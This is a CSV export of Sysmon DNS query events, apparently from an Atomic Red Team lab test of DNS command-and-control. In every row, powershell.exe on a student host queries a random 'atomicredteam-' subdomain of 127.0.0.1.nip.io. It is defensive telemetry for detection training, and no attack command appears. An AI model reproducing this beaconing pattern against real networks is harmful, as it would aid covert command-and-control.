"2025-12-26 11:27:38.814 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174726,"Query: atomicredteam-410838.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:37.813","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:38.814 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174727,"Query: atomicredteam-355792.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:37.851","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:38.814 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174728,"Query: atomicredteam-28400.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:37.890","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:38.814 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174729,"Query: atomicredteam-64619.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:38.058","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:38.814 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174730,"Query: atomicredteam-25561.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:38.096","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:38.814 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174731,"Query: atomicredteam-697532.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:38.134","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:38.815 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174732,"Query: atomicredteam-299361.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:38.172","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:38.815 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174733,"Query: atomicredteam-584969.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:38.209","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:38.815 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174734,"Query: atomicredteam-228436.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:38.247","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:38.815 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174735,"Query: atomicredteam-612058.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:38.417","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:38.815 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174736,"Query: atomicredteam-657763.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:38.455","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:38.815 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174737,"Query: atomicredteam-501041.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:38.493","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:38.815 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174738,"Query: atomicredteam-58742.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:38.531","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:38.815 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174739,"Query: atomicredteam-406806.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:38.569","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:38.815 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174740,"Query: atomicredteam-557054.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:38.607","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:38.815 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174741,"Query: atomicredteam-186027.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:38.646","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:38.815 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174742,"Query: atomicredteam-27639.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:38.686","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:39.826 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174743,"Query: atomicredteam-405284.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:38.724","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:39.826 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174744,"Query: atomicredteam-875273.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:38.763","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:39.826 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174745,"Query: atomicredteam-674959.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:38.801","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:39.826 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174746,"Query: atomicredteam-131178.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:38.840","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:39.826 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174747,"Query: atomicredteam-76649.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:38.879","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:39.826 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174748,"Query: atomicredteam-340426.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:38.916","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:39.826 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174749,"Query: atomicredteam-971514.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:39.089","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:39.826 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174750,"Query: atomicredteam-456723.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:39.267","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:39.826 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174751,"Query: atomicredteam-880232.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:39.307","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:39.827 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174752,"Query: atomicredteam-499034.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:39.346","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:39.827 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174753,"Query: atomicredteam-868987.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:39.385","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:39.827 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174754,"Query: atomicredteam-852952.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:39.425","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:39.827 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174755,"Query: atomicredteam-992092.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:39.463","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:39.827 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174756,"Query: atomicredteam-810372.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:39.501","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:39.827 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174757,"Query: atomicredteam-927776.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:39.539","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:40.840 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174758,"Query: atomicredteam-457020.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:39.577","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:40.840 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174759,"Query: atomicredteam-642852.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:39.613","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:40.840 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174760,"Query: atomicredteam-401232.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:39.939","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:40.840 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174761,"Query: atomicredteam-651294.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:39.976","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:40.840 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174762,"Query: atomicredteam-933314.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:40.014","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:40.840 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174763,"Query: atomicredteam-295769.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:40.060","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:40.840 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174764,"Query: atomicredteam-290927.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:40.098","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:40.840 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174765,"Query: atomicredteam-363854.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:40.137","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:40.840 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174766,"Query: atomicredteam-982313.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:40.176","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:40.840 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174767,"Query: atomicredteam-940634.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:40.214","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:40.840 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174768,"Query: atomicredteam-273593.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:40.393","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:41.852 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174769,"Query: atomicredteam-872227.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:40.711","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:41.852 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174770,"Query: atomicredteam-248736.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:40.882","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:41.852 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174771,"Query: atomicredteam-250071.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:40.922","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:41.852 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174772,"Query: atomicredteam-459471.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:40.960","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:41.852 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174773,"Query: atomicredteam-471795.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:40.997","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
